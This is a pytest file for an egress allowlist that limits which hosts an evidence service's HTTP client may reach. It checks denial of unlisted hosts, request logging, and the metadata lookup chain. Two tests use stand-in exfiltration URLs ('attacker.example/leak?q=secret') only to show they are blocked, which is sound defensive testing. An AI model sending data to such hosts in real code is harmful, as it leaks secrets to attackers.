"""Tests for the admitted-destination register and the client that enforces it."""

from __future__ import annotations

import asyncio
import contextlib
import importlib
import pkgutil
import urllib.parse

import httpx2
import pytest

from themis.litcache import resolve
from themis.services.evidence import deps as deps_mod
from themis.services.evidence import upstreams
from themis.services.evidence.upstreams import destinations
from themis.testing import openalex as fake_openalex

_TIMEOUT = httpx2.Timeout(5.0)


def _get(client: httpx2.AsyncClient, url: str) -> httpx2.Response:
    async def run() -> httpx2.Response:
        async with client:
            return await client.get(url)

    return asyncio.run(run())


def test_a_host_with_no_determination_cannot_be_reached() -> None:
    """The register is the record of a per-upstream determination, so an absent one denies."""
    with pytest.raises(destinations.UnadmittedDestinationError, match=r'attacker\.example'):
        _get(destinations.admitting_client(timeout=_TIMEOUT), 'https://attacker.example/leak?q=secret')


def test_the_shared_evidence_client_is_the_admitting_one(monkeypatch: pytest.MonkeyPatch) -> None:
    """Every live upstream call rides this client; built plainly, nothing would hold the register."""
    monkeypatch.setenv('THEMIS_AUTHORIZER_BACKEND', 'fixture')
    monkeypatch.setenv('THEMIS_EVIDENCE_FIXTURE_CONTEXTS', '{}')
    monkeypatch.setenv('THEMIS_EVIDENCE_FIXTURE_CALLERS', '{}')
    monkeypatch.setenv('THEMIS_GCP_PROJECT', 'x')

    async def run() -> None:
        async with contextlib.AsyncExitStack() as stack:
            deps = await deps_mod.deps_from_env(stack)
            with pytest.raises(destinations.UnadmittedDestinationError):
                await deps.http_client.get('https://attacker.example/leak')

    asyncio.run(run())


def _url_constants() -> list[tuple[str, str]]:
    """Every URL-shaped module constant the adapters hold, as `(where, host)`."""
    found: list[tuple[str, str]] = []
    for module in pkgutil.iter_modules(upstreams.__path__):
        if module.ispkg or module.name == 'destinations':
            continue
        imported = importlib.import_module(f'{upstreams.__name__}.{module.name}')
        for name, value in vars(imported).items():
            if isinstance(value, str) and value.startswith('http'):
                found.append((f'{module.name}.{name}', urllib.parse.urlsplit(value).netloc))
    return found


def test_every_url_an_adapter_holds_names_an_accounted_host() -> None:
    """An early warning, not the enforcement: a URL inside a function body would escape this.

    The client is what actually denies an unaccounted host; this fails at test time instead of on the
    first live call, and it forces the identifier-shaped constants to be named rather than assumed.
    """
    constants = _url_constants()
    assert constants, 'no adapter URL constants found — the walk is looking in the wrong place'
    unaccounted = {where: host for where, host in constants if not destinations.is_named(host)}
    assert not unaccounted


def test_a_completed_call_is_logged_with_what_was_asked(caplog: pytest.LogCaptureFixture) -> None:
    """The record of upstream calls is the client library's own; nothing here would notice it going away.

    It is what makes the residual channel in request timing and volume answerable after the fact
    (`docs/design/security.md`), so an upgrade that dropped or reworded the line has to fail here.
    """
    transport = httpx2.MockTransport(lambda _: httpx2.Response(200, json={}))
    client = destinations.admitting_client(timeout=_TIMEOUT, transport=transport)
    with caplog.at_level('INFO', logger='httpx2'):
        _get(client, 'https://rest.ensembl.org/vep/human/hgvs/NM_1.1%3Ac.1A%3EG')
    assert 'rest.ensembl.org/vep/human/hgvs/NM_1.1%3Ac.1A%3EG' in caplog.text
    assert '200' in caplog.text


def test_the_metadata_ladder_reaches_its_indexes_through_the_register() -> None:
    """The ingest path's upstreams are litcache's, so the walk above — over `upstreams` — misses them.

    `MaybeIngestPapers` resolves an id the corpus lacks through `resolve.resolve_metadata`, whose two
    rungs and the OpenAlex lookup beside them are dialled from `themis.litcache`, on this client.
    Driving the real ladder against a transport that answers is what catches an index whose host left
    the register: an unadmitted one raises before the transport is reached.
    """
    asked: list[str] = []

    def answer(request: httpx2.Request) -> httpx2.Response:
        asked.append(request.url.host)
        # efetch holds nothing under the PMID, so the DOI falls to Crossref, whose work sends the
        # lookup on to OpenAlex, which holds no work of it.
        if request.url.host == 'eutils.ncbi.nlm.nih.gov':
            return httpx2.Response(200, content=b'<PubmedArticleSet/>')
        if request.url.host == 'api.crossref.org':
            message = {'DOI': '10.1038/s41586-020-2649-2', 'title': ['T'], 'publisher': 'X'}
            return httpx2.Response(200, json={'message': message})
        return httpx2.Response(200, json={'meta': {'count': 0}, 'results': []})

    async def run() -> resolve.ResolvedPaper:
        async with destinations.admitting_client(timeout=_TIMEOUT, transport=httpx2.MockTransport(answer)) as client:
            return await resolve.resolve_metadata(
                pmid='29089047',
                doi='10.1038/s41586-020-2649-2',
                http_client=client,
                openalex_api_key=fake_openalex.API_KEY,
            )

    asyncio.run(run())
    # Every index, so no host's absence from the register can hide behind another answering.
    assert set(asked) == {'eutils.ncbi.nlm.nih.gov', 'api.crossref.org', 'api.openalex.org'}
